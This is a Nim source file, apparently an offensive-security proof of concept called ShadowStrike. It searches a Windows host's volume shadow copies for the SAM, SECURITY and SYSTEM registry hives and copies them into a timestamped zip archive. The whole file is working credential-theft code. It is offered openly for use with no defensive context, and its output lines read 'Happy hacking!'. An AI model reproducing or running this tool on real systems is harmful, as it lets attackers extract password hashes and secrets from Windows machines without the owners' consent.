#[
    ShadowStrike | Nim Implementation
    Author: HuskyHacks

    POC: enumerates host drives for shadow volumes of SAM, SYSTEM, and SECURITY hive keys.
    First build: naive implementation, no OPSEC considerations, hacky, and that's the way I like it.
    PRs welcome :)

]#

import os
import times
import zippy/ziparchives
import tables

proc shadowSteal(): void =
    let time = cast[string](format(now(), "yyyyMMddhhmm"))
    let archive = ZipArchive()
    var isFound: bool = false

    echo "[*] Executing ShadowSteal..."
    echo "[*] Time: ", time
    echo "[*] Searching for shadow volumes on this host..."    

    for i in 1 .. 512:
        let configPath = "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy" & $i & "\\Windows\\System32\\config\\"

        for elem in @["SAM", "SECURITY", "SYSTEM"]:
            if fileExists(configPath & elem):
                isFound = true
                echo "[*] Found: ", configPath & elem
                let fi = getFileInfo(configPath & elem)
                archive.contents["HarddiskVolumeShadowCopy" & $i & "/" & $fi.lastWriteTime & "_" & elem] = ArchiveEntry(contents: readFile(configPath & elem))

    if isFound:
        echo "[*] Compressing... ", time & "_ShadowSteal.zip"
        archive.writeZipArchive(time & "_ShadowSteal.zip")
        echo "[*] Done! Happy hacking!"
        quit(0)
    else:
        echo "No files found. SOL dude."
        quit(9)

when defined(windows):
    when defined(i386):
        echo "[-] Not designed for a 32 bit processor. Exiting..."
        quit()
    
    when isMainModule:
            shadowSteal()